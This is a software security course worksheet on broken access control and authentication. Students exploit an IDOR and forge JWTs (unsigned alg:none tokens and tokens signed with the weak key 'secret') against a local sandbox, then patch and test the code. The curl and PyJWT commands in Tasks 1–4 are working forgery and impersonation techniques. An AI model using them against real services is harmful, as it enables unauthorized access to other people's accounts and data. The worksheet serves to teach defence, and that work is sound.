# Worksheet 6 — Authentication, Sessions & Access Control

> **Course:** Software Security (KOSEN69) · **Week 6**
> **Aligned:** OWASP 2025 **A01 Broken Access Control**, **A07 Authentication Failures** · **CWE-639** (IDOR), **CWE-347** (improper signature verification), **CWE-321** (weak hardcoded key)
> **Signature games:** 🗺️ **IDOR Treasure Hunt** — walk the `oid` numbers to loot orders that aren't yours · 🔏 **JWT Forgery** — mint a token you were never given.

> ⚠️ **Ethics note:** Forging tokens and accessing other users' objects is only legal in this sandbox (`vulnerable_app.py`) and your own Juice Shop. Doing it to a real service is unauthorized access. Keep all activity inside `http://localhost:8080`.

## Class and assessment contract

**Contact time: 150 minutes** (09:05–11:50) = quiz/review 10 + explanation/demo 15 + supervised practical 100 + debrief/reasoning 20 + evidence/exit 5. Build the lab image before class (see below). In class you do Tasks 0–3 and 5; Task 4 is optional.

**Common practical 60 points + one assigned 40-point section.** This week odd student IDs do **Conventional** (Part 2 written questions 20 + Part 4 reflection 20) and even student IDs do **AIR-Sec** (Audit-the-AI 20 + Explain-in-Plain-English 10 + Prompt Problem 10); the mapping swaps every week. Each version totals 100. Each of the twelve individual teaching worksheets contributes `score / 100 × 2.5` course points.

Your instructor may ask you to show or repeat any step. This only checks that the work is yours; it does not change the score. Write your answers on the Week 6 answer sheet for your format (odd ID: Conventional file; even ID: AIR-Sec file), and say there which AI tool you used, if any.

## Part 1 — Student Information

Fill these in at the top of your answer sheet:

| Name | Student ID | Date | Code link (branch wk06) | AI tool used (if any) |
|---|---|---|---|---|
| | | | | |

![Diagram of one request passing two gates: Gate 1 authentication accepts an alg:none forgery, a weak-secret forgery, and alice's real token, then Gate 2 authorization fails to check ownership so alice's valid token reads bob's /api/orders/2 as IDOR, with the solution_app.py fixes for both.](img/authn-vs-authz.svg)

## Part 2 — Lecture Questions

Answer in 2–4 sentences each.

1. Distinguish **authentication** from **authorization**. In `vulnerable_app.py`, `get_order` calls `current_user()` but ignores its result — which of the two is missing?
2. What is **IDOR** (CWE-639)? Why is `/api/orders/<oid>` exploitable, and what ownership check in `solution_app.py` closes it?
3. Explain the **`alg:none`** JWT attack. In `current_user()`, the vulnerable branch passes **both** `algorithms=["none"]` *and* `options={"verify_signature": False}` — which of the two actually disables signature checking? (With the pinned PyJWT version, `jwt.decode(tok, algorithms=["none"])` without the `options=` still raises `InvalidSignatureError`.)
4. Why is the hardcoded HMAC secret `"secret"` (CWE-321) dangerous even if `alg:none` were disabled? How does a strong random secret + pinned algorithm defend the token?
5. What do the JWT claims **`exp`** and **`aud`** add, and why does the secure version reject tokens that lack them?

## Part 3 — Shared practical core (100 min in class)

**100-minute core:** Legitimate session (5), cross-user IDOR (20), unsigned JWT (15), weak-key JWT (15), student verification/ownership patch and controls (45).

The minute labels are activity budgets. Task 4 is optional follow-up practice and adds no graded points. Complete Part 2/Part 4 only for the assigned Conventional 40, or Audit/EiPE/Prompt only for the assigned AIR-Sec 40.


**Learning goals:** observe IDOR and two JWT forgeries (`alg:none` and weak secret), then implement ownership and token verification in `student_patch.py` and prove the controls with `student_checks.py`. `solution_app.py` is a comparison reference.


**Prerequisites:** Docker + Docker Compose and `curl` on the host; optionally Burp Suite. Working folder: `~/software-security/labs/week06-authn-authz/`. On Windows, type every command in the Ubuntu app. The prebuilt image supplies Python, Flask and PyJWT for the target, token minting and student checks. No host Python or PyJWT install is required.

**Before class — build once while online, then self-check offline:**
```bash
cd ~/software-security/labs/week06-authn-authz
docker compose build
docker run --rm --network none kosen-swsec-week06:local python -c 'import flask,jwt; print("Week 6 image ready")'
```

### Environment setup

```bash
docker compose up --no-build --pull never
```
This runs `vulnerable_app.py` from the prebuilt image (service `authz-lab`) at `http://localhost:8080`. If you see `No such image`, you have not built it yet: run `docker compose build` while online. Run this in the same lab folder used for the build. Open a second terminal there for the commands below.
Optional secondary target / proxy (not graded): Juice Shop opens at `http://localhost:3000`.
```bash
docker run --rm -p 127.0.0.1:3000:3000 bkimminich/juice-shop
```
If you use Burp Suite, put the proxy listener **and** the browser proxy on `127.0.0.1:8081`, not 8080: the lab app already owns host port 8080. Burp's default listener is 8080, so change it; otherwise the listener refuses to start ("Address already in use") or every request goes straight to the app and you intercept nothing.

**What to submit per task:** the exact **command/token**, a **screenshot** of the JSON response, and a **2–3 sentence mitigation**.

---

**Task 0 — Onboarding (5 min, in class).** Get alice's token (from `attack.md`):
```bash
TOKEN=$(curl -s -X POST http://localhost:8080/login \
  -H 'Content-Type: application/json' \
  -d '{"user":"alice","pw":"alicepw"}' | docker run --rm -i --network none kosen-swsec-week06:local \
    python -c 'import sys,json;print(json.load(sys.stdin)["token"])')
echo "$TOKEN"
```
Confirm `/api/orders/1` returns alice's Laptop order. *Deliverable: screenshot of the token + order 1.*

**Task 1 — IDOR Treasure Hunt (20 min, in class) 🗺️.**
- *Goal:* read **bob's** order with **alice's** token.
- *Steps:*
  ```bash
  curl -s http://localhost:8080/api/orders/1 -H "Authorization: Bearer $TOKEN"
  curl -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $TOKEN"
  ```
  The first request is your own order (alice's Laptop); the second leaks bob's `Phone` order, including a demo `FLAG{...}` that is the same for everyone. Paste it in the Task 1 box as evidence; nothing is submitted on ctf.zcr.ai.
- *Deliverable:* both responses + screenshot of bob's `Phone` order + why the missing ownership check (CWE-639) is the root cause.

```sim
jwt-forge
```

**Task 2 — JWT Forgery via alg:none (15 min, in class) 🔏.**
- *Goal:* impersonate bob with an **unsigned** token (no secret needed).
- *Steps:*
  ```bash
  FORGED=$(docker run --rm --network none kosen-swsec-week06:local \
    python -c 'import jwt; print(jwt.encode({"sub":"bob"}, key="", algorithm="none"))')
  curl -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $FORGED"
  ```
- *Deliverable:* the forged token + screenshot of the accepted response + explanation of the `none` flaw (CWE-347).

**Task 3 — JWT Forgery via weak secret (15 min, in class) 🔏.**
- *Goal:* sign a *valid* HS256 token because the secret is the guessable string `secret` (CWE-321).
- *Steps:*
  ```bash
  FORGED2=$(docker run --rm --network none kosen-swsec-week06:local \
    python -c 'import jwt; print(jwt.encode({"sub":"bob"}, "secret", algorithm="HS256"))')
  curl -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $FORGED2"
  ```
- *Note:* recent PyJWT prints an `InsecureKeyLengthWarning` to **stderr** because `"secret"` is only 6 bytes — that is expected, the token still mints and is accepted.
- *Deliverable:* token + screenshot + 2–3 sentences on why secret strength + key management matter.

**Task 4 — Optional extension: admin forgery (home practice, no extra points) 🔏.**
- *Goal:* read the admin-only flag at `/api/admin` — a page **IDOR cannot reach**: there is no object id to walk, and there is no `admin` account you could log in as (`USERS` has only alice and bob). The only way in is to forge your identity.
- *Steps:* forge a token claiming `sub=admin` (either technique from Task 2/3 works — `alg:none` or the weak `"secret"`), then call `/api/admin`:
  ```bash
  FORGED=$(docker run --rm --network none kosen-swsec-week06:local \
    python -c 'import jwt; print(jwt.encode({"sub":"admin"}, key="", algorithm="none"))')
  curl -s http://localhost:8080/api/admin -H "Authorization: Bearer $FORGED"
  ```
  You should get a demo `FLAG{...}` (the same for everyone; paste it in the optional Task 4 box). Then confirm alice's **real** token gets `403 forbidden` on the same endpoint — proof the server's role check (`if user != "admin"`) is fine; the break is purely that authentication accepted a forged identity.
- *Deliverable:* the forged token + screenshot of the flag + the `403` for alice's real token, and 2–3 sentences: why IDOR can't reach this (horizontal access vs. **vertical** privilege escalation), and why the app's own `if user != "admin"` check didn't save it.

**Task 5 — Defend / fix it (45 min, in class) 🛡️.**
- *Goal:* implement token verification and order ownership in `student_patch.py`, then prove both legitimate and attack cases with `student_checks.py`.
- *Steps:* follow the required student-patch instructions below. Run the `student_checks.py` Docker command before and after your edit; the untouched TODOs must fail, and the completed patch must pass the positive and negative controls. The prewritten `solution_app.py` is available for comparison after your own tests.
- *Deliverable:* your `student_patch.py` commit, the failing-before and passing-after test results, and a short explanation of how JWT verification and object ownership stop the two failure paths. Running or citing `solution_app.py` alone is insufficient.


### Student patch — required common practical evidence

Complete `student_patch.py`: verify a JWT with the supplied secret and audience, allow only HS256, require `sub`, `aud` and `exp`, and enforce ownership on the requested order. The provided harness already supplies legitimate short-lived tokens; obtain them through `/login` rather than borrowing a token from a different app/run.

```bash
docker run --rm --network none -v "$PWD":/lab -w /lab kosen-swsec-week06:local python student_checks.py
```

The untouched TODOs fail. Your implementation must allow Alice's own order and Bob's own order, reject Alice reading Bob's order (403), reject absent/unsigned/wrong-key/expired/wrong-audience/missing-claim tokens (401), and keep a legitimate non-admin refused at `/api/admin` (403). Tests use Flask's in-process client and open no listener. Stop the other target before the optional browser run:

```bash
docker compose run --rm --no-deps --service-ports authz-lab python student_app.py
```

Submit your patch commit link (commit `student_patch.py` to branch `wk06` in your own fork and push; see [SUBMISSION.md](../../SUBMISSION.md); do not open a pull request), positive and negative tests, and why authentication and object authorization are distinct decisions. The supplied `solution_app.py` stays as the complete reference; running that file alone does not demonstrate your implementation.

## Part 4 — Reflection

1. **CWE/OWASP mapping:** map IDOR → **CWE-639 / A01**, the JWT forgeries → **CWE-347 & CWE-321 / A07**.
2. **Real breach and evidence:** read the [Australian privacy regulator's account of the 2022 Optus breach](https://www.oaic.gov.au/news/media-centre/australian-information-commissioner-takes-civil-penalty-action-against-optus). It confirms unauthorized access to millions of customer records, but does not establish the exact IDOR mechanism used in our sandbox. In 3–4 sentences distinguish the confirmed facts from a possible access-control failure, then compare the *impact* with Task 1. Do not claim the real incident used our specific endpoint or token flaw without a source.
3. **Best mitigation:** between deny-by-default ownership checks, pinning the JWT algorithm, and a strong managed secret, which control protects the most attack surface here, and why is server-side authorization non-negotiable?

## Grading rubric (100)

| Criterion | Conventional | AIR-Sec |
|---|---:|---:|
| Common practical: main task and observations | 20 | 20 |
| Common practical: student defense/control or design, tests and limitations | 20 | 20 |
| Common practical: reproducible evidence and reasoning | 20 | 20 |
| Assigned Conventional Part 2 written questions | 20 | — |
| Assigned Conventional Part 4 reflection | 20 | — |
| Assigned Audit-the-AI | — | 20 |
| Assigned Explain-in-Plain-English | — | 10 |
| Assigned Prompt Problem | — | 10 |
| **Total** | **100** | **100** |

**Due:** Monday 14 December 2026, 23:59 (Thai time); check learn.zcr.ai/submit for the exact time. **Late:** −10% per started day; 0 after 10 days.

---

## Evidence & Integrity — common to both versions

- **Identity proof:** every screenshot/diagram must show a terminal running `printf '%s | %s | ' "$(whoami)" '<YOUR-STUDENT-ID>'; date '+%F %T %Z'` **in the
  same image as the evidence**. When the evidence is a browser page, a DevTools panel or a
  rendered response, put that terminal **beside the browser and capture the whole screen** — a
  cropped window carries nothing that identifies you, and the lab's own output is
  byte-identical for the whole cohort *by design*, so the stamp is the only thing that makes
  the shot yours. Generic or borrowed evidence is not accepted.
- **Flags this week:** the local lab prints the same demo `FLAG{...}` values for everyone (Task 1 and optional Task 4). They are the expected evidence: paste them in those boxes with your stamped screenshots. Nothing is submitted on ctf.zcr.ai. Submit the worksheet PDF at **learn.zcr.ai/submit** (full guide: [SUBMISSION.md](../../SUBMISSION.md)).
- **Common practical reasoning** *(graded within the common 60, not as another EiPE score):*
  1. What did you do, and **why did the vulnerability work**?
  2. **Why does your fix actually stop it** — and what could still break it?

---

## 🤖 Audit the AI — assigned AIR-Sec section (20)

AI is a power tool you must **distrust** — you are graded on your *critique*, not the AI's answer.

1. Audit a complete AI answer about this week's design, exploit or fix. If your instructor gives you an AI answer to audit, use it; otherwise ask an AI assistant to fix `vulnerable_app.py` and paste its full answer. A correct answer is allowed: verify its claims and state the remaining assumptions rather than inventing an error.
2. **Check what is correct, wrong, risky or conditional** — insecure code, an incomplete fix, a hallucinated API/function/CVE, an edge case or unsupported reasoning. Quote the exact line(s) and support the evaluation with evidence.
3. Supply a verified correction where needed; if the answer is correct, supply the verification and limits. Explain your conclusion in 2–3 sentences. Do not manufacture a defect to satisfy the task.

> Write which AI tool you used in the table at the top of your answer sheet. This is the assigned AIR-Sec Audit component (20 points); it is not added to the common 60 or to the Conventional 40.

---

## 🧠 Comprehension & Prompt — assigned AIR-Sec section (10 + 10)

**A. Explain in Plain English (EiPE).** In 2–3 sentences, in your own words, describe what this week's vulnerable code/endpoint actually *does* and *why it is exploitable* — explain the mechanism, don't dump jargon.

**B. Prompt Problem.** Write a **single prompt** that makes an AI produce a *correct, secure* fix for one finding. Run it: does the exploit now fail? If not, refine the prompt and try again. Submit the **final prompt + the verified result**.
*Graded on the prompt's precision and your verification — this trains problem decomposition and AI literacy (Denny et al. 2024).*
